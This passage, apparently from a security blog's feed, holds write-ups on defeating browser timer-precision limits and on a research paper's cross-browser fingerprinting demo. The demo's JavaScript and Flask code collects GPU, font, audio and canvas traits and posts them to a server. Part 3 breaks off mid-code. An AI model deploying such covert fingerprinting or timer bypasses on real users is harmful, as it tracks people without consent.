alt=""><br><img src="/images/2019-01-24-21-53-26.png" alt=""></p><h2 id="测试与结论"><a href="#测试与结论" class="headerlink" title="测试与结论"></a>测试与结论</h2><p>我以<code>crypto.getRandomValues(new Uint8Array(n));</code>为例测试<br>用<code>performance.now()</code>的结果和<code>measure()</code>进行做差比较，不难发现</p><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><p>在Chrome 57版本下，差异仅在10微秒以内。(注：结果由<code>performance.now()</code>经过进制转换输出)<br><img src="/images/2019-01-24-14-53-45.png" alt=""><br><img src="/images/2019-01-24-14-56-48.png" alt=""><br>而在Chrome 71版本下，差异却达到了50微秒以内(注：结果由<code>performance.now()</code>经过进制转换输出)<br><img src="/images/2019-01-24-14-54-54.png" alt=""><br><img src="/images/2019-01-24-14-57-26.png" alt=""><br>原因也很明显，因为71版本的<code>performance.now()</code>降低了精度，并且加入了抖动，导致许多<code>end-start</code>的值为0<br>那么我们在71版本下直接测试侧信道方式得到的时间<br><img src="/images/2019-01-24-15-10-13.png" alt=""><br>不难发现，其实在71版本下计算差是没有意义的，因为<code>performance.now()</code>的精度已经变为100微秒<br>所以做差得到的值基本是侧信道方式测得的结果。<br>所以我们基本可以确定，这样的方式在目前chrome版本可以得到比<code>performance.now()</code>更高精度的时间测量<br>但我们的目的肯定不局限于Chrome，我们再看看Firefox</p><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><p>对于Firefox就更过分了,通过<code>performance.now()</code>测量高精度时间直接变成了不可能，因为精度被调整成了毫秒级，所以<code>end-start</code>的值都变为了0<br><img src="/images/2019-01-24-15-19-07.png" alt=""><br>而对于侧信道测量方式<br><img src="/images/2019-01-24-15-20-06.png" alt=""><br>我们依旧还是可以测量出许多微秒级的时间</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这样的方式可以有效突破浏览器的高精度函数毫秒级的限制，甚至对于一些特定攻击依旧奏效。<br>若有更好的方式还请大佬不吝赐教~</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/32629875" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/32629875</a><br><a href="https://link.springer.com/chapter/10.1007/978-3-319-70972-7_13" target="_blank" rel="noopener">https://link.springer.com/chapter/10.1007/978-3-319-70972-7_13</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="study" scheme="http://skysec.top/categories/study/"/>
    
    
      <category term="study" scheme="http://skysec.top/tags/study/"/>
    
  </entry>
  
  <entry>
    <title>Cross-Browser-Tracking-Summary-Part-4</title>
    <link href="http://skysec.top/2018/12/24/Cross-Browser-Tracking-Summary-Part-4/"/>
    <id>http://skysec.top/2018/12/24/Cross-Browser-Tracking-Summary-Part-4/</id>
    <published>2018-12-24T02:40:23.000Z</published>
    <updated>2019-01-27T13:44:46.121Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知 https://xz.aliyun.com/t/3724</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章主要讲解了论文中具有代表性的模块的代码实现，这一篇文章主要讲论文的整体架构和处理流程，包括数据生成，数据收集，数据处理等。</p><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p><img src="/images/2018-12-24-16-10-13.png" alt=""><br>1.后端给前端下发渲染任务<br>2.前端进行渲染，并且将部分结果进行hash后发送给后端<br>3.渲染任务同时搜集浏览器信息，设备信息，一并发送给后端<br>4.后端接收到数据进行处理<br>5.生成浏览器指纹与设备指纹<br>6.将指纹存储到数据库，并将指纹打印到前端</p><h2 id="模块整合-数据生成"><a href="#模块整合-数据生成" class="headerlink" title="模块整合/数据生成"></a>模块整合/数据生成</h2><p>作者使用loader.js进行模块整合，测试项目大概如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> CubeTest(<span class="string">'normal'</span>));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> CubeTest(<span class="string">'aa'</span>));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> CameraTest());</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> LineTest(<span class="string">'normal'</span>));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> LineTest(<span class="string">'aa'</span>));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> TextureTest(....));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> TextureTest(....));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> SimpleLightTest(....));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> SimpleLightTest(....));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> MoreLightTest(....));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> TwoTexturesMoreLightTest(....));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> TransparentTest(....));</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> LightingTest());</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> ClippingTest());</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> BubbleTest());</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> CompressedTextureTest());</span><br><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> ShadowTest());</span><br></pre></td></tr></table></figure></p><p>测试结果利用<code>dataurl</code>传递给toServer.js进行hash处理<br>例如<code>CubeTest(&#39;normal&#39;)</code>结果如下<br><img src="/images/2018-12-24-15-46-31.png" alt=""><br>这十多个任务基本用来测试GPU的渲染<br>然后还有浏览器的字符渲染支持测试<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.asyncTests.push(<span class="keyword">new</span> LanguageDector());</span><br></pre></td></tr></table></figure></p><p>将浏览器支持的字符返回给后端</p><h2 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h2><p>对于数据的搜集，作者这里使用了toServer.js，大致代码解读如下<br>作者对如下数据进行测试和搜集<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Sender = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.finalized = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">this</span>.postData = &#123;</span><br><span class="line">    fontlist: <span class="string">"No Flash"</span>,</span><br><span class="line">    fonts: <span class="string">""</span>,</span><br><span class="line">    WebGL: <span class="literal">false</span>,</span><br><span class="line">    inc: <span class="string">"Undefined"</span>,</span><br><span class="line">    gpu: <span class="string">"Undefined"</span>,</span><br><span class="line">    hash: <span class="string">"Undefined"</span>,</span><br><span class="line">    timezone: <span class="string">"Undefined"</span>,</span><br><span class="line">    resolution: <span class="string">"Undefined"</span>,</span><br><span class="line">    plugins: <span class="string">"Undefined"</span>,</span><br><span class="line">    cookie: <span class="string">"Undefined"</span>,</span><br><span class="line">    localstorage: <span class="string">"Undefined"</span>,</span><br><span class="line">    manufacturer: <span class="string">"Undefined"</span>,</span><br><span class="line">    gpuImgs: &#123;&#125;,</span><br><span class="line">    adBlock: <span class="string">"Undefined"</span>,</span><br><span class="line">    cpu_cores: <span class="string">"Undefined"</span>, </span><br><span class="line">    canvas_test: <span class="string">"Undefined"</span>, </span><br><span class="line">    audio: <span class="string">"Undefined"</span>,</span><br><span class="line">    langsDetected: [],</span><br><span class="line">    video: []</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><p>在调用toServer函数的时候，会传入5个参数，分别是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebGL, inc, gpu, hash, id, dataurl</span><br></pre></td></tr></table></figure></p><p>然后进行相应赋值<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.toServer = <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    WebGL, inc, gpu, hash, id,</span></span></span><br><span class="line"><span class="function"><span class="params">    dataurl</span>) </span>&#123; <span class="comment">// send messages to server and receive messages from server</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.postData[<span class="string">'gpuImgs'</span>][id] = dataurl.hashCode();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (WebGL) &#123;</span><br><span class="line">    <span class="keyword">this</span>.postData[<span class="string">'WebGL'</span>] = WebGL;</span><br><span class="line">    <span class="keyword">this</span>.postData[<span class="string">'inc'</span>] = inc;</span><br><span class="line">    <span class="keyword">this</span>.postData[<span class="string">'gpu'</span>] = gpu;</span><br><span class="line">    <span class="keyword">this</span>.postData[<span class="string">'hash'</span>] = hash; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其中的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.postData[<span class="string">'inc'</span>] = inc;</span><br><span class="line"><span class="keyword">this</span>.postData[<span class="string">'gpu'</span>] = gpu;</span><br></pre></td></tr></table></figure></p><p>分别来自于<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);</span><br><span class="line">gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);</span><br></pre></td></tr></table></figure></p><p>对于<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.postData[<span class="string">'gpuImgs'</span>][id] = dataurl.hashCode();</span><br><span class="line"><span class="keyword">this</span>.postData[<span class="string">'hash'</span>] = hash;</span><br></pre></td></tr></table></figure></p><p>来自于如下运算<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Uint8Array</span>.prototype.hashCode = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> hash = <span class="number">0</span>, i, chr, len;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.length === <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>, len = <span class="keyword">this</span>.length; i &lt; len; i++) &#123;</span><br><span class="line">    chr = <span class="keyword">this</span>[i];</span><br><span class="line">    hash = ((hash &lt;&lt; <span class="number">5</span>) - hash) + chr;</span><br><span class="line">    hash |= <span class="number">0</span>; <span class="comment">// Convert to 32bit integer</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里我们知道<code>dataurl</code>是各种模块渲染的结果传递而来，然后利用hashcode转成数字，得到大致如下结果<br><img src="/images/2018-12-24-15-52-42.png" alt=""><br>紧接着<br><img src="/images/2018-12-24-10-52-17.png" alt=""><br>作者对4422种字体进行探测，若支持，则标记为1，不支持则标记为0<br>得到形如如下的数组<br><img src="/images/2018-12-24-10-49-35.png" alt=""><br>然后有进行了本地时间与 GMT 时间之间的时间差的搜集：<br><img src="/images/2018-12-24-10-52-33.png" alt=""><br>例如我的<br><img src="/images/2018-12-24-10-52-53.png" alt=""><br>然后作者又搜集了分辨率<br><img src="/images/2018-12-24-10-56-49.png" alt=""><br>这里搜集了浏览器缩放比例，浏览器的页面大小等，如下<br>缩放比例：80%<br><img src="/images/2018-12-24-11-00-12.png" alt=""><br><img src="/images/2018-12-24-11-00-36.png" alt=""><br>缩放比例：100%<br><img src="/images/2018-12-24-11-00-58.png" alt=""><br><img src="/images/2018-12-24-11-00-52.png" alt=""><br>浏览器页面大小：小窗和窗口最大化。缩放比例100%<br><img src="/images/2018-12-24-11-02-19.png" alt=""><br>然后作者又使用了navigator对象，获取了如下参数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.postData[<span class="string">'plugins'</span>] = navigator.plugins;</span><br><span class="line"><span class="keyword">this</span>.postData[<span class="string">'cookie'</span>] = navigator.cookieEnabled;</span><br><span class="line"><span class="keyword">this</span>.postData[<span class="string">'cpu_cores'</span>] = navigator.hardwareConcurrency;</span><br></pre></td></tr></table></figure></p><p>然后又使用了<code>localStorage</code>特性，判断浏览器是否支持localStorage这个属性<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        localStorage.setItem(<span class="string">'test'</span>, <span class="string">'test'</span>);</span><br><span class="line">        localStorage.removeItem(<span class="string">'test'</span>);</span><br><span class="line">        <span class="keyword">this</span>.postData[<span class="string">'localstorage'</span>] = <span class="literal">true</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">this</span>.postData[<span class="string">'localstorage'</span>] = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></p><p>最后收集如下信息<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.postData[<span class="string">'adBlock'</span>] = $(<span class="string">'#ad'</span>)[<span class="number">0</span>] == <span class="literal">null</span> ? <span class="string">'Yes'</span> : <span class="string">'No'</span>;</span><br><span class="line"><span class="keyword">this</span>.postData[<span class="string">'canvas_test'</span>] = Base64EncodeUrlSafe(calcSHA1(cvs_test.substring(<span class="number">22</span>, cvs_test.length)));</span><br><span class="line"><span class="keyword">this</span>.postData[<span class="string">'audio'</span>] = audioFingerPrinting();</span><br><span class="line"><span class="keyword">this</span>.postData[<span class="string">'langsDetected'</span>] = get_writing_scripts();</span><br></pre></td></tr></table></figure></p><p>然后将数据发送到指定ip<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startSend</span>(<span class="params">postData</span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">          url : <span class="string">"http://"</span> + ip_address + <span class="string">"/features"</span>,</span><br><span class="line">          dataType : <span class="string">"json"</span>,</span><br><span class="line">          contentType: <span class="string">'application/json'</span>,</span><br><span class="line">          type : <span class="string">'POST'</span>,</span><br><span class="line">          data : <span class="built_in">JSON</span>.stringify(postData),</span><br><span class="line">          success : <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            data[<span class="string">'finished'</span>] = <span class="literal">true</span>;</span><br><span class="line">            parent.postMessage(data,<span class="string">"http://uniquemachine.org"</span>);</span><br><span class="line">          &#125;,</span><br><span class="line">          error: <span class="function"><span class="keyword">function</span> (<span class="params">xhr, ajaxOptions, thrownError</span>) </span>&#123;</span><br><span class="line">            alert(thrownError);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>后端采用python flask框架编写<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/features', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">features</span><span class="params">()</span>:</span></span><br><span class="line">    agent = <span class="string">""</span></span><br><span class="line">    accept = <span class="string">""</span></span><br><span class="line">    encoding = <span class="string">""</span></span><br><span class="line">    language = <span class="string">""</span></span><br><span class="line">    IP = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        agent = request.headers.get(<span class="string">'User-Agent'</span>)</span><br><span class="line">        accpet = request.headers.get(<span class="string">'Accept'</span>)</span><br><span class="line">        encoding = request.headers.get(<span class="string">'Accept-Encoding'</span>)</span><br><span class="line">        language = request.headers.get(<span class="string">'Accept-Language'</span>)</span><br><span class="line">        IP = request.remote_addr</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><p>但由于是demo，很多功能尚未加入，这里的跨浏览器特性就只用到了2个，难怪稳定性不是很高= =<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">feature_list = [</span><br><span class="line">      <span class="string">"agent"</span>,</span><br><span class="line">      <span class="string">"accept"</span>,</span><br><span class="line">      <span class="string">"encoding"</span>,</span><br><span class="line">      <span class="string">"language"</span>,</span><br><span class="line">      <span class="string">"langsDetected"</span>,</span><br><span class="line">      <span class="string">"resolution"</span>,</span><br><span class="line">      <span class="string">"fonts"</span>,</span><br><span class="line">      <span class="string">"WebGL"</span>, </span><br><span class="line">      <span class="string">"inc"</span>, </span><br><span class="line">      <span class="string">"gpu"</span>, </span><br><span class="line">      <span class="string">"gpuImgs"</span>, </span><br><span class="line">      <span class="string">"timezone"</span>, </span><br><span class="line">      <span class="string">"plugins"</span>, </span><br><span class="line">      <span class="string">"cookie"</span>, </span><br><span class="line">      <span class="string">"localstorage"</span>, </span><br><span class="line">      <span class="string">"adBlock"</span>, </span><br><span class="line">      <span class="string">"cpu_cores"</span>, </span><br><span class="line">      <span class="string">"canvas_test"</span>, </span><br><span class="line">      <span class="string">"audio"</span>]</span><br><span class="line"></span><br><span class="line">cross_feature_list = [</span><br><span class="line">      <span class="string">"timezone"</span>,</span><br><span class="line">      <span class="string">"fonts"</span>,</span><br><span class="line">      <span class="string">"langsDetected"</span>,</span><br><span class="line">      <span class="string">"audio"</span></span><br><span class="line">      ]</span><br></pre></td></tr></table></figure></p><p>处理方式也比较简单，没有想象中的复杂<br><img src="/images/2018-12-24-15-06-40.png" alt=""><br>作者简单的通过agent去判断是否为mac，然后加载了不同的mask<br><img src="/images/2018-12-24-15-05-44.png" alt=""><br>然后利用之前搜集的支持的字体<br><img src="/images/2018-12-24-15-06-12.png" alt=""><br>进行与运算<br>然后作者将所有特性的值字符串化然后拼接在一起，再进行md5，得到哈希值，作为浏览器指纹和设备指纹<br><img src="/images/2018-12-25-10-48-40.png" alt=""><br><img src="/images/2018-12-25-10-48-54.png" alt=""><img src="/images/2018-12-25-10-49-06.png" alt=""></p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>因为作者给出了demo网站，我进行了测试</p><ul><li>同一ip，不同浏览器(Safari，Firefox，Chrome)<br><img src="/images/2018-12-21-14-58-58.jpg" alt=""><br>识别都失败了<br>当然，也有成功的人(Chrome，Firefox)<br><img src="/images/2018-12-21-15-34-14.png" alt=""></li><li>不同ip，同一浏览器(Chrome)<br>挂上代理后<br><img src="/images/2018-12-21-14-39-56.png" alt=""><br>不挂代理<br><img src="/images/2018-12-21-14-47-06.png" alt=""><br>发现识别成功。</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>进行跨浏览器设备指纹识别依旧是一个难题，论文提出了很多有趣的特征，我也不能一一阐述解释，并且由于这只是论文的demo，稳定性不够强可以理解，这可以为我们后续工作做一些启发与指引。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="study" scheme="http://skysec.top/categories/study/"/>
    
    
      <category term="study" scheme="http://skysec.top/tags/study/"/>
    
  </entry>
  
  <entry>
    <title>Cross-Browser-Tracking-Summary-Part-3</title>
    <link href="http://skysec.top/2018/12/21/Cross-Browser-Tracking-Summary-Part-3/"/>
    <id>http://skysec.top/2018/12/21/Cross-Browser-Tracking-Summary-Part-3/</id>
    <published>2018-12-21T05:26:41.000Z</published>
    <updated>2019-01-27T13:45:16.120Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知 https://xz.aliyun.com/t/3723</span><br></pre></td></tr></table></figure><h2 id="渲染部分实现"><a href="#渲染部分实现" class="headerlink" title="渲染部分实现"></a>渲染部分实现</h2><p>多数代码均利用webgl进行渲染，更重要的是模型和参数的选取，已经在前一篇文章简单介绍。对渲染代码感兴趣的可以自行学习图形学。这里我们主要介绍数据的收集和利用。</p><h3 id="数据收集"><a href="#数据收集" class="headerlink" title="数据收集"></a>数据收集</h3><p>这里对图像的渲染结果基本利用下述方法进行结果获取<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.getData = <span class="function"><span class="keyword">function</span>(<span class="params">gl, id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.finalized) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"Still generating ID's"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> WebGL = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">var</span> pixels = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">256</span> * <span class="number">256</span> * <span class="number">4</span>);</span><br><span class="line">  gl.readPixels(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">256</span>, gl.RGBA, gl.UNSIGNED_BYTE, pixels);</span><br><span class="line">  <span class="keyword">var</span> ven, ren;</span><br><span class="line">  <span class="keyword">var</span> debugInfo = gl.getExtension(<span class="string">'WEBGL_debug_renderer_info'</span>);</span><br><span class="line">  <span class="keyword">if</span> (debugInfo) &#123;</span><br><span class="line">    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);</span><br><span class="line">    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"debugInfo is not accessable"</span>);</span><br><span class="line">    ven = <span class="string">'No debug Info'</span>;</span><br><span class="line">    ren = <span class="string">'No debug Info'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> hash = pixels.hashCode();</span><br><span class="line">  <span class="keyword">this</span>.toServer(WebGL, ven, ren, hash, id, pixels);</span><br><span class="line">  <span class="keyword">if</span> (sumRGB(pixels) &gt; <span class="number">1.0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> hashRGB(pixels);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>关键点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gl.readPixels(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="number">256</span>, gl.RGBA, gl.UNSIGNED_BYTE, pixels);</span><br></pre></td></tr></table></figure></p><p>这里7个参数分别为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void gl.readPixels(x, y, width, height, format, type, pixels);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-25-16-00-07.png" alt=""><br>由于图片均为256*256的，所以前4个参数为<code>0,0,256,256</code><br>第5个参数<br><img src="/images/2018-12-25-16-00-30.png" alt=""><br>第6，7个参数<br><img src="/images/2018-12-25-16-02-35.png" alt=""><br>那么我们代码中的使用<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pixels = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">1</span> * <span class="number">1</span> * <span class="number">4</span>);</span><br><span class="line">gl.readPixels(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, gl.RGBA, gl.UNSIGNED_BYTE, pixels);</span><br></pre></td></tr></table></figure></p><p>对于一个像素点返回为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0, 0, 0, 255]</span><br></pre></td></tr></table></figure></p><p>对应的分别为<code>Red, green, blue and alpha</code><br>对于一张256<em>256渲染过后的图片，如下<br><img src="/images/2018-12-25-16-11-11.png" alt=""><br>可以得到如下数组<br><img src="/images/2018-12-25-16-09-19.png" alt=""><br>作者生成了一个256</em>256*4的数组存放<code>Red, green, blue and alpha</code><br>然后经过hash后返回给Server<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = 